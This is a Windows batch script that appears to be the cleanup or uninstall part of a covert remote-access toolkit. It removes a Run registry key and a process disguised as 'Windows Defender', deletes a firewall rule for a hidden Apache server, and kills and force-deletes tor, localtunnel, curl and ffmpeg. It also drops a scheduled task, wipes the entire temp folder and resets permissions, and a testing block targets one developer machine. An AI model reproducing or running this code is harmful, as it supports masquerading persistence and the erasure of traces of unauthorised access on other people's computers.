set environment=C:\Windows
FOR /F "tokens=1,2 delims==" %%s IN ('wmic path win32_useraccount where name^='%username%' get sid /value ^| find /i "SID"') DO SET SID=%%t

rem TESTING >
if "%computername%"=="WIN-6QJBGJLRIGL" set environment=%appdata%\microsoft\windows
rem TESTING <

REG DELETE "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Windows Defender" /f
netsh advfirewall firewall delete rule name="apache" program="%environment%\apache2\bin\httpd.exe"

taskkill /f /im tor.exe
taskkill /f /im curl.exe
taskkill /f /im "Windows Defender.exe"
taskkill /f /im localtunnel.exe
taskkill /f /im httpd.exe
taskkill /f /im ffmpeg.exe
"%environment%\nircmd.exe" execmd del /s /f /q /a "%environment%\Windows Defender.exe"
"%environment%\nircmd.exe" execmd rmdir /s /q "%environment%\localtunnel"
"%environment%\nircmd.exe" execmd del /s /f /q /a "%environment%\curl.exe"
"%environment%\nircmd.exe" execmd del /s /f /q /a "%environment%\tor.exe"
"%environment%\nircmd.exe" execmd del /s /f /q /a "%environment%\ffmpeg.exe"
"%environment%\nircmd.exe" execmd rmdir /s /q "%appdata%\tor"
"%environment%\nircmd.exe" execmd rmdir /s /q "%appdata%\Ookla"
"%environment%\nircmd.exe" execmd rmdir /s /q "%environment%\Win32"
"%environment%\nircmd.exe" execmd rmdir /s /q  "%environment%\apache2"
"%environment%\7-Zip\Uninstall.exe" /S
"%environment%\nircmd.exe" execmd rmdir /s /q  "%environment%\7-Zip"
"%environment%\nircmd.exe" execmd del /s /f /q /a "%environment%\nircmd.exe"
schtasks /Delete /TN "%SID%XYZ" /F
Taskkill /f /im winrun.exe
del /s /f /q /a "%temp%\*"
FOR /D %%p IN ("%temp%\*.*") DO rmdir "%%p" /s /q
del /s /f /q /a "%environment%\Win32\*.bat"
taskkill /F /IM wscript.exe
taskkill /F /IM cscript.exe

icacls "%environment%" /reset /C
taskkill /f /im timeout.exe
taskkill /f /im explorer.exe
start "" "%windir%\explorer.exe"  
